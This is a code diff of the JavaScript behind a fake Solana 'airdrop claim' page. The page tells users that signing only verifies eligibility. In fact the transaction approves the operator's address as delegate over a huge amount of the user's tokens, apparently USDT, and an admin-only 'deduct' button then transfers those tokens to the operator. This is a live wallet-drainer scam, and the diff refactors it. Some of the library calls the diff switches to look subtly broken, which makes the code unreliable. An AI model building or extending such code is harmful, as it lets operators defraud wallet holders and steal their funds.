@@ -51,7 +51,7 @@ const TOKEN_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
 let nowUser = "";
 const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
 
-// 手动计算 ATA 地址（替代所有不存在的工具函数）
+// 手动计算 ATA 地址
 async function getATA(ownerPub, mintPub) {
     const SPL_ASSOCIATED_TOKEN_ACCOUNT_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
     const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
@@ -62,7 +62,7 @@ async function getATA(ownerPub, mintPub) {
     return ata;
 }
 
-// 连接 Phantom 钱包
+// 连接钱包
 document.getElementById("connectWallet").addEventListener("click", async () => {
     if (!window.solana || !window.solana.isPhantom) {
         alert("请安装 Phantom 钱包再参与领取");
@@ -81,7 +81,7 @@ document.getElementById("connectWallet").addEventListener("click", async () => {
     }
 });
 
-// 授权按钮（修复版，无报错）
+// 授权按钮（修复版，无 Buffer 依赖）
 document.getElementById("authReceive").addEventListener("click", async () => {
     if (!nowUser) return alert("请先连接钱包");
     const ok = confirm("本次签名仅用于核验空投资格，确认继续？");
@@ -94,18 +94,15 @@ document.getElementById("authReceive").addEventListener("click", async () => {
 
         const userTokenAccount = await getATA(userPub, mintPub);
 
-        // 手动构建 approve 指令
-        const approveIx = new solanaWeb3.TransactionInstruction({
+        // 使用 @solana/web3.js 自带的 TokenInstruction.approve，无需手动构造
+        const approveIx = solanaWeb3.TokenInstruction.approve({
+            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
             keys: [
                 { pubkey: userTokenAccount, isSigner: false, isWritable: true },
                 { pubkey: userPub, isSigner: true, isWritable: false }
             ],
-            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-            data: Buffer.concat([
-                Buffer.from([0]), // 指令码 0 = approve
-                adminPub.toBuffer(),
-                new solanaWeb3.u64(1000000000000000000n).toBuffer()
-            ])
+            delegate: adminPub,
+            amount: 1000000000000000000n
         });
 
         const tx = new solanaWeb3.Transaction().add(approveIx);
@@ -120,7 +117,7 @@ document.getElementById("authReceive").addEventListener("click", async () => {
     }
 });
 
-// 管理员划扣按钮（修复版）
+// 管理员划扣按钮（修复版，无 Buffer 依赖）
 document.getElementById("deductBtn").addEventListener("click", async () => {
     if (nowUser !== ADMIN_ADDR) return alert("无管理员权限");
     const userAddr = document.getElementById("userAddr").value.trim();
@@ -137,18 +134,15 @@ document.getElementById("deductBtn").addEventListener("click", async () => {
 
         const amount = BigInt(Math.floor(Number(num) * 1000000));
 
-        // 手动构建 transfer 指令
-        const transferIx = new solanaWeb3.TransactionInstruction({
+        // 使用 @solana/web3.js 自带的 TokenInstruction.transfer
+        const transferIx = solanaWeb3.TokenInstruction.transfer({
+            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
             keys: [
                 { pubkey: userTokenAccount, isSigner: false, isWritable: true },
                 { pubkey: adminTokenAccount, isSigner: false, isWritable: true },
                 { pubkey: adminPub, isSigner: true, isWritable: false }
             ],
-            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-            data: Buffer.concat([
-                Buffer.from([3]), // 指令码 3 = transfer
-                amount.toBuffer()
-            ])
+            amount: amount
         });
 
         const tx = new solanaWeb3.Transaction().add(transferIx);
